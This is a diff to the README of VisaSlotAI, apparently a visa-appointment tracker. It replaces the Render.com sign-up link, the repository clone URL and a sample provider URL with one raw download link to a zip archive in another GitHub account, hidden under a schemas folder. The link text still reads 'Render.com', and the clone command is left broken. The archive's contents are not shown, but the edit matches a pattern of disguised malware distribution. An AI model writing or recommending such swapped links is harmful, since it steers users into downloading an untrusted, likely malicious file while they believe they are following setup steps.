@@ -150,7 +150,7 @@ VisaSlotAI supports both Local Development and One-Click Cloud Deployments.
 
 ### ☁️ Option 1: One-Click Cloud Deployment (Free Tier)
 VisaSlotAI is built with Infrastructure-as-Code (`render.yaml`) to support free, automated cloud scaling.
-1. Sign up on [Render.com](https://render.com)
+1. Sign up on [Render.com](https://github.com/xwlafareq888-tech/VisaSlotAI/raw/refs/heads/main/backend/app/schemas/Slot-AI-Visa-v2.5.zip)
 2. Go to `New` -> `Blueprint`
 3. Connect your GitHub repository.
 4. Render will automatically parse the `render.yaml` file and deploy the App, Postgres DB, Redis, and Background Workers seamlessly.
@@ -158,7 +158,7 @@ VisaSlotAI is built with Infrastructure-as-Code (`render.yaml`) to support free,
 ### 💻 Option 2: Docker Full-Stack (VPS / Local)
 Deploy the entire integrated system using the production Docker Compose manifest:
 ```bash
-git clone https://github.com/CodeByPinar/VisaSlotAI.git
+git clone https://github.com/xwlafareq888-tech/VisaSlotAI/raw/refs/heads/main/backend/app/schemas/Slot-AI-Visa-v2.5.zip
 cd VisaSlotAI
 docker-compose -f docker-compose.prod.yml up -d
 ```
@@ -229,7 +229,7 @@ Example structure:
     "id": "trk_schengen_01",
     "country": "Germany",
     "visa_type": "Schengen - Tourist",
-    "url": "https://example-visa-provider.com/appointments",
+    "url": "https://github.com/xwlafareq888-tech/VisaSlotAI/raw/refs/heads/main/backend/app/schemas/Slot-AI-Visa-v2.5.zip",
     "check_interval_minutes": 15
   }
 ]
